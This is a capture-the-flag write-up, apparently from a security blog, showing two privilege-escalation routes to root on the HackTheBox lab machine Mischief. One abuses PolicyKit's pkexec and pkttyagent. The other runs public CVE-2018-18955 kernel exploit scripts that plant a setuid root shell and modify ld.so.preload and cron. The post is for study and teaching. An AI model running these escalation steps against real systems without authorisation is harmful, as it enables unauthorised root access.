---
title: HTB: Mischief Additional Roots
url: https://0xdf.gitlab.io/2019/01/08/htb-mischief-more-root.html
date: 2019-01-08T19:27:54+00:00
tags: htb-mischief, hackthebox, ctf, cve-2018-18955, policykit, polkit, pkexec, pkttyagent, metasploit, msf-local
---

Since publishing my [write-up on Mischief](/2019/01/05/htb-mischief.html) from HackTheBox, I’ve learned of two additional ways to privesc to root once I have access as loki. The first is another method to get around the fact the `su` was blocked on the host using PolicyKit with the root password. The second was to take advantage of a kernel bug that was publicly released in November, well after Mischief went live. I’ll quickly show both those methods.

## PolicyKit

### Background

PolicyKit is software that’s designed to be an alternative to `sudo`, where instead of defining what can be run in a file on each host, it provides an api that can be used by privileged programs to offer services to unprivleged programs. I wasn’t familiar with framework before this example, but it seems that the components come standard on many Linux distros (it is present on my daily Ubuntu 18.04 desktop).

Props to [fjv](https://www.hackthebox.eu/home/users/profile/66373) for pointing this one out on the HTB forums.

### How It Works

In this case, I’ll need two shells on Mischief, both as loki, and the root password from loki’s history file. Getting two shells is easy to do, as I can just ssh in twice, or, better yet, ssh in and run `tmux`.

First, I’ll need to get the pid of the bash process in the first terminal:

```

loki@Mischief:/dev/shm$ echo $$
25923

```

Next, I’ll start `pkttyagent` in the second terminal with the `--process` flag. This flag lets me specify the pid of the process that will be subject to this agent.

```

loki@Mischief:/dev/shm$ pkttyagent --process 25923

```

On doing this, this terminal will just hang and wait to be contacted. Back in the first terminal, I’ll now run `pkexec` to start a process. I’ll pass in `--user root` to say I want to run as root, and `bash -i` as the command I want to run:

```

loki@Mischief:/dev/shm$ pkexec --user root bash -i

```

On doing that, the second window asks for root’s password:

```

==== AUTHENTICATING FOR org.freedesktop.policykit.exec ===
Authentication is needed to run `/bin/bash' as the super user
Authenticating as: root
Password: 

```

When I enter the correct password, it replies:

```

==== AUTHENTICATION COMPLETE ===

```

Back in the first window, I now have a root shell:

```

root@Mischief:~# id         
uid=0(root) gid=0(root) groups=0(root)

```

Here’s the entier thing in action:

![](https://0xdfimages.gitlab.io/img/mischief-pkexec-root.gif)

## CVE-2018-18955

[saket sourav](https://disqus.com/by/disqus_lGROGMGeNJ/) left a comment on the [original Mischief post](/2019/01/05/htb-mischief.html) suggesting there was a kernel vulnerability. With a little researhc, I figured out that he was likely referring to CVE-2018-18955.

To pull this off, I’ll grab the code from here: https://github.com/bcoles/kernel-exploits/tree/master/CVE-2018-18955. There’s also a Metasploit version available:

```

msf > search 18955

Matching Modules
================

   Name                                                       Disclosure Date  Rank   Check  Description
   ----                                                       ---------------  ----   -----  -----------
   exploit/linux/local/nested_namespace_idmap_limit_priv_esc  2018-11-15       great  Yes    Linux Nested User Namespace idmap Limit Local Privilege Escalation

```

But I’ll go without Metasploit. First, I’ll copy the files to target:

```

root@kali:/opt/kernel-exploits/CVE-2018-18955# scp * loki@10.10.10.92:/dev/shm/
loki@10.10.10.92's password: 
exploit.cron.sh                                                                                                                                                                           100% 2303   113.8KB/s   00:00    
exploit.dbus.sh                                                                                                                                                                           100% 3829   192.1KB/s   00:00    
exploit.ldpreload.sh                                                                                                                                                                      100% 2017    95.0KB/s   00:00    
exploit.polkit.sh                                                                                                                                                                         100% 2827   134.8KB/s   00:00    
libsubuid.c                                                                                                                                                                               100%  351    17.2KB/s   00:00    
rootshell.c                                                                                                                                                                               100%  143     7.0KB/s   00:00    
subshell.c                                                                                                                                                                                100% 1604    76.9KB/s   00:00    
subuid_shell.c   

```

Now I’ll just run one of the sh scripts and I get root, in this case the dbus variant:

```

root@Mischief:/dev/shm# ./exploit.dbus.sh 
[*] Compiling...
[*] Creating /usr/share/dbus-1/system-services/org.subuid.Service.service...
[.] starting
[.] setting up namespace
[~] done, namespace sandbox set up
[.] mapping subordinate ids
[.] subuid: 100000
[.] subgid: 100000
[~] done, mapped subordinate ids
[.] executing subshell
[*] Creating /etc/dbus-1/system.d/org.subuid.Service.conf...
[.] starting
[.] setting up namespace
[~] done, namespace sandbox set up
[.] mapping subordinate ids
[.] subuid: 100000
[.] subgid: 100000
[~] done, mapped subordinate ids
[.] executing subshell
[*] Launching dbus service...
Error org.freedesktop.DBus.Error.NoReply: Did not receive a reply. Possible causes include: the remote application did not send a reply, the message bus security policy blocked the reply, the reply timeout expired, or the network connection was broken.
[+] Success:
-rwsrwxr-x 1 root root 8384 Jan  8 20:37 /tmp/sh
[*] Cleaning up...
[*] Launching root shell: /tmp/sh
root@Mischief:/dev/shm# id
uid=0(root) gid=0(root) groups=0(root),1004(loki)
root@Mischief:/dev/shm# cat /root/root.txt 
The flag is not here, get a shell to find it!

```

The different sh scripts just take advantage of different mechanisms to hit the same vulnerability. Each one creates a setuid shell as `/tmp/sh` owned by root. It’s a good idea to clean that file up once you have a root shell.

I was able to get three of the four to work (the cron one makes you wait what feels like forever). If you do try to run more than one, just note that you need to clean up the `/tmp/sh` file before trying the next one, or the script will fail.

`exploit.ldpreload.sh`:

```

loki@Mischief:/dev/shm$ ./exploit.ldpreload.sh 
[*] Compiling...
[*] Adding libsubuid.so to /etc/ld.so.preload...
[.] starting
[.] setting up namespace
[~] done, namespace sandbox set up
[.] mapping subordinate ids
[.] subuid: 165536
[.] subgid: 165536
[~] done, mapped subordinate ids
[.] executing subshell
[+] Success:
-rwsrwxr-x 1 root root 8384 Jan  8 20:41 /tmp/sh
[*] Cleaning up...
[*] Launching root shell: /tmp/sh
root@Mischief:/dev/shm#

```

`exploit.cron.sh`:

```

loki@Mischief:/dev/shm$ ./exploit.cron.sh 
[*] Compiling...
[*] Writing payload to /tmp/payload...
[*] Adding cron job... (wait a minute)
[.] starting
[.] setting up namespace
[~] done, namespace sandbox set up
[.] mapping subordinate ids
[.] subuid: 165536
[.] subgid: 165536
[~] done, mapped subordinate ids
[.] executing subshell
[+] Success:
-rwsrwxr-x 1 root root 8384 Jan  8 20:42 /tmp/sh
[*] Cleaning up...
[*] Launching root shell: /tmp/sh
root@Mischief:/dev/shm# 

```

I’m not sure why the polkit script didn’t work, but I didn’t put much time into it. It is interesting to see PolicyKit utilized for the second time today.